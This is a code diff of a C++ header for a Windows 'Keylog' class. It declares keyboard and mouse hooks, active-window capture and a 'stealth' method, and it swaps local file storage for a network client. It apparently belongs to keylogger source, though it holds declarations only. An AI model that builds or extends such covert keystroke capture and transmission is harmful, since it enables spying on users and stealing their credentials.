@@ -13,25 +13,27 @@
 
 #include <iostream>
 #include <fstream>
+#include "ClientNetwork.hh"
 #include <Windows.h>
 #include <string>
 
+extern ClientNetwork net;
 
 class __declspec(dllexport) Keylog
 {
 public:
 	Keylog();
 	~Keylog();
-	int		getKey();
-	COORD	getMouse();
-	int		getForeground();
-	void	setKey(int);
-	void	setMouse(int, int);
-	int		stealth();
+	const int		&getKey() const;
+	const COORD	&getMouse() const;
+	const int		getForeground();
+	void	setKey(const int &);
+	void	setMouse(const int &, const int &);
+	const int		stealth();
 
 	bool __stdcall	installhook();
-	std::string		GetActiveWindowTitle();
-	bool			peekMsg();
+	const std::string		GetActiveWindowTitle();
+	const bool			peekMsg();
 	static	LRESULT __stdcall  CALLBACK	KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 	static	LRESULT CALLBACK	LowLevelMouseProc(int code, WPARAM wParam, LPARAM lParam);
 
@@ -47,8 +49,6 @@ private:
 	// Peek Message
 	MSG		msg;
 
-	// File DB
-	FILE	file_db;
 };
 
 
